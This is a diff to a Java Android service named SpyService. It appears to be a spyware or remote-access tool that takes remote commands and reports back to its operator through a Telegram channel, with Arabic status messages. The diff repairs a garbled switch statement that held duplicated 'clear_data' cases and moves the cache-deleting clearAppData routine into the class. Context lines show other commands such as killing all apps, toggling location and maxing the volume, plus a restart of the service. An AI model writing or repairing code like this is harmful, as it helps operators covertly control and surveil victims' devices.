@@ -1182,6 +1182,30 @@ public class SpyService extends Service {
         }
     }
 
+    private void clearAppData() {
+        try {
+            File cacheDir = getCacheDir();
+            if (cacheDir != null && cacheDir.exists()) {
+                deleteDir(cacheDir);
+                sendTextToTelegram("🗑️ تم مسح بيانات التطبيق المؤقتة");
+            } else {
+                sendTextToTelegram("⚠️ لا يوجد بيانات مؤقتة لمسحها");
+            }
+        } catch (Exception e) {
+            sendTextToTelegram("❌ فشل مسح البيانات: " + e.getMessage());
+        }
+    }
+
+    private boolean deleteDir(File dir) {
+        if (dir.isDirectory()) {
+            String[] children = dir.list();
+            for (String child : children) {
+                boolean success = deleteDir(new File(dir, child));
+                if (!success) return false;
+            }
+        }
+        return dir.delete();
+    }
 
     private void killAllApps() {
         try {
@@ -1724,26 +1748,17 @@ public class SpyService extends Service {
                     toggleLocation(false);
                     break;
                 }
+                case "clear_data": {
+                    clearAppData();
+                    break;
                 }
                 case "kill_apps": {
                     killAllApps();
                     break;
                 }
                 case "vibrate": {
-                case "clear_data": {
-                    clearAppData();
-                    break;
-                }
                     vibrateDevice();
-                case "clear_data": {
-                    clearAppData();
                     break;
-                }
-                    break;
-                case "clear_data": {
-                    clearAppData();
-                    break;
-                }
                 }
                 case "set_volume_max": {
                     setVolumeMax();
@@ -1844,29 +1859,3 @@ public class SpyService extends Service {
         startService(new Intent(this, SpyService.class));
     }
 }
-
-    private void clearAppData() {
-        try {
-            // طريقة بديلة: مسح ذاكرة التخزين المؤقت فقط
-            File cacheDir = getCacheDir();
-            if (cacheDir != null && cacheDir.exists()) {
-                deleteDir(cacheDir);
-                sendTextToTelegram("🗑️ تم مسح بيانات التطبيق المؤقتة");
-            } else {
-                sendTextToTelegram("⚠️ لا يوجد بيانات مؤقتة لمسحها");
-            }
-        } catch (Exception e) {
-            sendTextToTelegram("❌ فشل مسح البيانات: " + e.getMessage());
-        }
-    }
-
-    private boolean deleteDir(File dir) {
-        if (dir.isDirectory()) {
-            String[] children = dir.list();
-            for (String child : children) {
-                boolean success = deleteDir(new File(dir, child));
-                if (!success) return false;
-            }
-        }
-        return dir.delete();
-    }
